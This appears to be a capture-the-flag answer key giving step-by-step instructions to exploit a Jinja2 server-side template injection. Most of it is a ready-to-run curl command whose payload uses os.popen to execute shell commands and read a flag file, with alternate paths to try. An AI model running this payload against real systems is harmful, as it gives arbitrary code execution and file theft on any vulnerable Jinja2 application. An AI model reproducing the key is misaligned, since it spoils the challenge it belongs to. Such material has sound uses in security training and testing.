# EXACT SOLUTION — FOLLOW THESE STEPS IN ORDER

Vulnerability: Jinja2 SSTI. The `username` query parameter is concatenated into a
Jinja2 template string that is then compiled and rendered, giving template
injection → RCE.

1. **Send a Jinja2 RCE payload** on the root path that reads the flag file:

   ```
   curl -s -G "http://<target>/" \
     --data-urlencode "username={{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read() }}"
   ```

   (If `flag.txt` isn't found, try `/flag.txt` or `/flag`.)

2. **Extract the flag** (`FLAG{...}`) from the rendered response and report it
   verbatim.
